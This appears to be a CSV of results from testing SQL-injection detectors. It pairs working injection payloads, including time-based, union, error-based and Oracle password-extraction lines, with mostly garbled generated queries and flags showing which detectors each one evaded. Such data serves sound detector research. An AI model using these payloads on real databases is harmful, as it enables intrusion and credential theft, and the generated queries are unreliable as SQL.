original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25","SELECT MIN(USER()) FROM SQL, SELECT SELECT FROM @@VERSION,SLEEP(5),USER(), SELECT MIN(USER()) FROM SQL JOIN SELECT SELECT SELECT MIN(USER()) FROM SQL JOIN SELECT BENCHMARK(1000000)",0,1,1,0,1,1,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM ) SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT SUM(srmq ) FROM SELECT SUM((SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT SUM(SELECT * FROM,0,0,0,1,1,1,0
"1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SELECT NOT (crypt_key, COUNT(crypt_key) FROM query, database WHERE SQL = 'valid') ORDER BY SQL_injection",0,0,0,0,1,0,0
"1%'   )    )     )   and elt  (  7425  =  3843,3843  )   and    (    (     (  '%'  =  '","SELECT MIN((((((((((((((()) FROM SQL injection) AND NOT SELECT DISTINCT elt ( 7425 = 3843,3843) AND ((((((((((((((((( %) = ) FROM SQL injection)",0,1,0,0,0,0,0
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injection,1,1,0,0,0,0,0
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT 0x7171706a71 = 'evade SQL injection detection'",1,0,1,1,1,1,1
1'+  (  select 'wpnm' where 8223  =  8223 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',SELECT MIN(sequence) FROM SQL injection JOIN Query: 1'+ WHERE 8223 = 8223 AND 6240 = (SELECT MIN(sequence) FROM rdb$database ) ||'qzvzq') +',0,1,0,0,0,0,0
"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE 3086,3086 = 3327 AND NOT case when ( 3086 = 3327) ORDER BY COUNT(*) DESC",0,1,0,0,0,0,0
"""));waitfor delay '0:0:__TIME__'--",SELECT MIN(duration) FROM '0:0:__TIME__'-- for'sql injection',1,1,1,0,0,0,0
"-3205""  )   union all select 5233,5233,5233,5233#","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL -3205"" ) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sq",1,1,1,0,1,1,0
"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",SELECT MIN(s) FROM SQL injection_description) FROM SQL_injection,1,0,0,1,1,1,0
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  ""","SELECT MIN(0x71706a71, 0x71706a71, 0x7171706a71,'sql injection' FROM SQL JOIN x from (SELECT MIN(success injection) FROM SQL JOIN 3051 union select 3051 union select 1210 - & %')",1,1,0,0,1,0,0
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp","SELECT MIN(7982,concat) FROM SQL_injection WHERE NOT elt (0x7171706a71 ) = 'evade SQL injection'",1,1,0,0,1,0,0
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",SELECT MIN(sql) FROM SQL_injection) FROM SQL,1,0,1,1,1,1,1
"1%""   )    )    union all select null,null--","SELECT NOT Null,null-- FROM SQL SELECT MIN(null--) FROM SQL SELECT MIN(null--) FROM SQL",1,1,1,1,1,1,1
"-3767'  )   as eefl where 8260  =  8260 union all select 8260,8260,8260,8260,8260,8260,8260#","SELECT MIN(8260,8260,8260,8260 FROM SQL_Injection AS _eefl_placed FROM SQL_Injection_Required = '8260 = 8260 union all select 8260,8260,8260,8260,8260,8260#' AND eefl = 'esq injection detection'",1,1,0,0,0,0,0
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""( @) or 1 = 1",0,1,0,0,0,0,0
"select * from generate_series  (  3379,3379,case when   (  3379  =  1219  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE NOT SQL_injection = ""valid"" AND NOT 3379 = 1219 ORDER BY case LIMIT 1",0,0,1,1,0,1,0
"1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --","SELECT MIN(8012 = 6026,6026) FROM SQL_Injection WHERE 4150 = 4150 AND NOT elt ( 8012 = 6026,6026 )",1,1,0,0,0,0,0
"1'+  (  select 'swxi' where 7651  =  7651 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",SELECT MIN(swxi) FROM SQL injection,1,0,1,1,1,1,1
"1 union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM SQL_inject,0,0,1,1,1,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126","SELECT MIN(EXC, SUM(EXX0000, Md5 ( 0x4c4d6142 ) FROM SQL_Inject SELECT MIN(EXCEPT SELECT DISTINCT esq_inject) FROM SQL_Inject SELECT md5 ( 5000000,md5 ( 0x4c4d6142 ) FROM query: SELECT MIN(EXT_8) FROM SQL SELECT MIN(8126 = 8126 = 8126) FROM SELECT MIN(EXCEPT SELECT SUM(EXX4C4d6142 ) FROM SELECT MIN(EXCEPT SELECT SUM(EXCEPT SELECT SUM(EXCEPT SELECT, SUM(EXX_C4d6142 ) FROM SELECT SUM(EXCEPT SELECT MIN(EXX_CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",1,1,0,0,1,0,0
"1""  )   where 4849  =  4849 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection WHERE 4849 = 4849 OR 4849 = 4849 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
"-1337""  )   union all select 7508--",SELECT MIN(7508--) FROM SQL_injection,1,0,1,1,1,1,1
"admin""  )   or   (  ""1""  =  ""1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
1'||  (  select 'jjpy' from dual where 6295  =  6295,SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection' FROM query: 1'|| (SELECT SELECT 'jjpy' FROM SQL SELECT SELECT 'jjpy' FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,1,1,0,1,1,0
"1""   )    )    union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null, null-- sulf injection detection FROM SQL, 'evade sq injection'",1,1,1,0,0,0,0
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#","SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM Query: -9384% union = ""SQL""",1,1,0,0,1,0,0
"1  )   as bfuy where 3879  =  3879 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SELECT NOT SQL_inject_key, COUNT(*) FROM SQL_inject WHERE 3879 = 3879 AND NOT crypt_key ='replaced' AND STRFTIME('%y', 107 - 109 - crypt_key",1,1,0,0,1,0,0
'))%20waitfor%20delay%20'0:0:20'%20--,SELECT MIN(%20waitfor%20delay%20'0:0:20'%20-- for:'sql injection detection',1,1,0,0,0,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"-4091""   )    )     )   union all select 6694,6694--","SELECT 6694,6694-- FROM SQL_Injection WHERE NOT 6694_- IN (SELECT MIN(SELECT MIN(6094 - 6694)",1,1,1,1,1,1,1
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw","SELECT MIN(*) FROM SQL_injection, COUNT(*) FROM query_series WHERE NOT query: 1 = ""sql injection detection"" ORDER BY COUNT(*)",1,0,1,0,1,1,0
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",SELECT MIN(sql) FROM SQL injection_message WHERE NOT chr ( 76 ) = 'dbms_pipe.receive_message' AND rupq = 'rupq',1,1,0,0,1,0,0
select   (  case when   (  9816  =  1693  )   then 9816 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM / dual - SELECT 0 FROM SQL- SELECT 0 FROM SQL- SELECT 0 FROM SQL- SELECT 0 FROM SQL- SELECT 0 FROM dual--,1,1,0,1,1,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",SELECT MIN(sql injection) FROM SQL_injection WHERE 7318 = 7318 AND 7331 = 6529--,1,1,0,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb","SELECT MIN(zfkb) FROM ""sql injection detection"" FROM SQL injection detection",1,0,0,1,1,1,0
1'||  (  select 'hkvl' from dual where 8882  =  8882,SELECT 'hkvl' FROM SQL injection',1,0,1,1,1,1,1
"1 or benchmark(10000000,MD5(1))#","SELECT NOT SQL_inject_name, COUNT(10000000,MD5(1)) FROM query: 1 ORDER BY query: 1",1,1,0,0,1,0,0
1' where 2145  =  2145,SELECT MIN(2145 = 2145) FROM SQL injection detection,1,0,0,0,1,0,0
"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT elt = 1185 OR exp (SELECT elt ( 6270 = 1185 ORDER BY elt),1,1,0,0,0,0,0
"1%'   )    )     )   union all select null,null#","SELECT null,null# FROM SQL injection",1,0,1,1,0,1,0
1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,SELECT DISTINCT (SQL injection) FROM SQL_injection) AND NOT (SQL = 3715 ORDER BY COUNT(SQL),1,0,1,0,0,0,0
"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection,1,0,1,1,1,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy","SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM benchmark WHERE NOT SQL_inject = 'valid'",1,1,0,0,1,0,0
"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#","SELECT MIN(9074,9074,9074,9074,9074# FROM SQL_Injection WHERE NOT SELECT MIN(9074,9074,9074,9074,9074,9074#) = 'SQL injection'",1,1,0,0,0,0,0
-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(6055 = 5748 = 5748 AND 6055 = ctxsys.drithsx.sn ( 6055) ||chr ( 113 ) FROM SQL injection detection),1,1,0,0,0,0,0
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",SELECT * FROM * FROM users WHERE NOT id = '1' OR. = 1,1,1,1,0,1,1,0
"' union (select NULL, NULL, NULL,  (select @@version)) --",SELECT MIN(select) FROM SQL injection_detect WHERE NOT select @@version) = 'evade sq injection detection',0,0,1,1,1,1,1
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = 'Y' AND query: 1%',1,1,0,0,0,0,0
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"-6775"" union all select 7484,7484#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT 7484,7484# FROM Query: -6775 union All select 7484,7484# FROM SQL_Injection",1,1,1,0,0,0,0
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",SELECT MIN(.) FROM SQL injection_detective WHERE NOT id = '1' union select (. ),1,0,0,0,1,0,0
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1,1,1,1,0,0,0,0
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,SELECT * FROM * FROM SQL_injection WHERE id = 1 + ( 1 ) ORDER BY 1 = 1,1,1,0,0,0,0,0
1  )   and 7533  =  7533 and   (  7175  =  7175,SELECT * FROM SQL AS t1 JOIN 1 query: 1 JOIN 1 AND 7533 = 7533 AND 7175 = 7175,0,1,1,0,0,0,0
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--","SELECT 4820,4820,4820,4820,4820,4820-- for SQL injection FROM SQL Query: -5041' )",1,1,1,0,0,0,0
select case when 6420  =  7941 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 6420 = 7941 AND NOT SELECT SELECT DISTINCT end-- end--,1,1,1,1,0,1,0
"-9082 union all select 9858,9858,9858,9858,9858,9858--","SELECT MIN(9858,9858,9858,9858,9858-- FROM SQL_Injection AS t1 JOIN Query: -9082 union All select 9858,9858,9858,9858,9858-- FROM SQL_Injection WHERE NOT t1.sql injection_detecting = 'evade SQL injection detection'",1,1,1,0,0,0,0
1'   )    )    as dqby where 9256  =  9256,SELECT DISTINCT evade SQL injection detection FROM SQL SELECT dqby WHERE 9256 = 9256,1,0,1,1,1,1,1
1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
select case when 3661  =  9315 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL_injection WHERE 3661 = 9315 AND NOT SELECT SELECT DISTINCT end-- end--,1,1,1,0,0,0,0
1%' waitfor delay '0:0:5' and '%'  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT % FROM SQL,1,0,0,1,1,1,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
1   )    )    as jvvs where 9594  =  9594,SELECT MIN(1 ) FROM jvvs WHERE NOT SQL_inject_sq = 9594,1,1,1,0,0,0,0
"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_Injection WHERE 3738 = 3738 OR 3738 = 3738 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--","SELECT MIN(300,3004,3004,3004-- FROM SQL SELECT MIN(3004,3004--) FROM SQL JOIN 3004,3004,3004--",1,1,1,1,0,1,0
"1   )    )    as sxhg where 7697  =  7697 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL WHERE 7697 = 7697 OR char( 117 ) ||char ( 105 ) ORDER BY crypt_key,1,1,0,0,0,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",SELECT MIN(sql ing) FROM SQL injection - SELECT MIN(sql ing) FROM SQL,1,0,1,1,1,1,1
1 where 1931  =  1931 and sleep  (  5  )  --,"SELECT * FROM query: 1 WHERE NOT SQL_injection = ""valid"" AND sleep ( 5 )",1,1,0,0,0,0,0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl","SELECT MIN(excat) FROM SQL, extractvalue WHERE NOT 0x5c = 'evade SQL injection' AND NOT 0x7171706a71 = 'tuzl'",1,1,1,0,1,1,0
"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT STRFTIME('%y', -1401) = '2480,3480'",1,1,0,0,1,0,0
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888","SELECT MIN(*) FROM SQL injection, SELECT MIN((*) FROM SQL_injection) FROM SQL_injection",1,1,1,0,1,1,0
"1   )    )     )   union all select null,null,null,null,null,null,null#","SELECT null,null,null FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - injecting FROM SQL",1,1,1,1,1,1,1
1%'  )   and 8734  =  5844,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT 8734 = 5844,1,1,1,1,1,1,1
"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SELECT MIN(sql) FROM SQL - SELECT gwxc FROM ""SQL - 3626 = 3626"" AND char( 107 ) ||char ( 77 )",1,1,0,0,0,0,0
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR SQL_injection = ""$ union select 1,@@VERSION -- 1""",1,1,1,0,0,0,0
1  )   and   (  3020  =  3020  )  *6703,SELECT *6703 FROM SQL AS _valid_sq_injector WHERE NOT SELECT *6703 FROM query: 1 ) AND 3020 = 3020,1,1,0,1,1,1,0
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL,1,0,1,1,1,1,1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,SELECT 6969 FROM pg_sleep ( 5 ) and 6969 = 'zoin',1,1,0,0,0,0,0
"1'   )    )    union all select null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL",1,1,1,0,0,0,0
') waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(5000000, md5 ( 0x544d5a4c ) FROM SQL injection AS t1 JOIN 7080 = 7080 OR 7080 = 7080 OR 8014 = benchmark (5000000,md5 ( 5000000, md5 ( 0x544d5a4c )",1,1,0,0,0,0,0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#","SELECT MIN(1000000,MD5(1000000) FROM SQL_Injection)",1,1,1,0,1,1,0
"1"" order by 1#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT jgoq, jgoq FROM SQL JOIN detection'",0,1,0,0,1,0,0
"1"" and 6637  =  2321",SELECT MIN(221) FROM SQL injection detection,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',SELECT MIN(1 AS _x28 end ) FROM SQL injection,1,0,1,1,0,1,0
; or '1'  =  '1',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: '1',1,0,1,0,1,1,0
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1","SELECT MIN(sql injection) FROM SQL_injection WHERE Id = 1 Union select 1 A,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT MIN(selection_exchange) FROM SQL injection WHERE 2679 = 2679 AND 6414 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(CASE WHEN STRFTIME('%y','sq injection') = 2679 = 2679 AND NOT STRFTIME('%y-%m-%d', SUM(SELECT SUM(succ_result) FROM rdb$functions as '%SQ%')",0,1,0,0,1,0,0
